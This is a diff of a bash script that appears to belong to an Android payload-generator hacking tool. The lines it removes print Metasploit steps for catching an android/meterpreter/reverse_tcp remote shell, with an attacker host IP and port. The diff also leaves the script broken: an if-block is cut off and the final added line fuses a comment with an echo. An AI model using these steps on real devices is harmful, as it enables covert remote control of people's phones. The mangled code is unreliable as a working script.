@@ -1105,35 +1105,4 @@ echo "    |      DOWN DOWN DOWN  DOWN DOWN DOWN!!!      |"
 echo "===>|_____________________________________________|"
 mainmenu
 ##END WELCOME MESSAGE##
-#######################
-##/WELCOME##
-echo "              _________________________________ "
-echo "[==========> |created by:Eko Saputra (evsystem)|"
-echo "[==========> |Version:1.1.0                    |"
-echo "[==========> |follow me on Github: @evsystem   |"
-echo "             |_________________________________|"
-echo -e $cyan
-echo "                        "
-echo "                        "
-echo "                        "
-echo "run msfconsole                       "
-echo "   |                     "
-echo "   |                     "
-echo "   |-----------> use exploit/multi/handler "
-echo "         |               "
-echo "         |               "
-echo "         |-----------> set payload android/meterpreter/reverse_tcp "
-echo "                |        "
-echo "                |        "
-echo "                |= set lhost 192.168.0.2 (ip anda)"
-echo "                |=set lport 4444 (default)  "
-echo "                  |      "
-echo "                  |[ exploit ] "
-
-echo -e $red
-echo -n -e "  Do you want exit? ( Y (ya) / N (tidak) ) :"
-      read back
-      if [ $back != 'n' ] && [ $back != 'N' ]
-          then
-          clear
-
+#######################echo "    |   twitter :@ekovegeance7                    |"
